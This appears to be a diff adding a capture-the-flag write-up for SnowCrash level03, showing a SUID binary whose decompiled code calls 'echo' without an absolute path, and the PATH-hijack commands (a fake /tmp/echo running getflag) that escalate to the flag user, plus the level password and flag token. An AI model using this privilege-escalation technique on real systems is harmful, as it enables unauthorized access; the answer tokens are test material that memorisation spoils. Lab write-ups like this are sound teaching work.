@@ -1,0 +1,53 @@
+su level03
+pass : kooda2puivaav1idi4f57q8iq
+
+level03@SnowCrash:~$ ls -la
+total 24
+dr-x------ 1 level03 level03  120 Mar  5  2016 .
+d--x--x--x 1 root    users    340 Aug 30  2015 ..
+-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
+-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
+
+level03@SnowCrash:~$ ./level03 
+Exploit me
+
+Tools for exploit binary files :  gdb / dogbolt.com
+
+10. Droits étendus
+Les droits étendus sont des variantes sur l’exécution 
+SUID sur un exécutable, valeur octale : 4000, valeur symbolique : s
+Quand le SUID est activé sur un exécutable, l’utilisateur qui exécute le fichier dispose des mêmes droits que le propriétaire.
+
+So if we execute getflaf through the file level03, it will be with the right of flag03 and should gives us the token
+
+DogBolt :
+int main(int argc,char **argv,char **envp)
+
+{
+  __gid_t __rgid;
+  __uid_t __ruid;
+  int iVar1;
+  gid_t gid;
+  uid_t uid;
+  
+  __rgid = getegid();
+  __ruid = geteuid();
+  setresgid(__rgid,__rgid,__rgid);
+  setresuid(__ruid,__ruid,__ruid);
+  iVar1 = system("/usr/bin/env echo Exploit me");
+  return iVar1;
+}
+
+Vunerability : the 'echo' command here do not use an absolute path. 
+So we can create an echo script and use it to use getflag instead
+
+level03@SnowCrash:~$ export PATH=/tmp:$PATH
+level03@SnowCrash:~$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+level03@SnowCrash:~$ echo '#!/bin/bash' > /tmp/echo
+level03@SnowCrash:~$ echo '/bin/getflag' >> /tmp/echo
+level03@SnowCrash:~$ chmod +x /tmp/echo
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
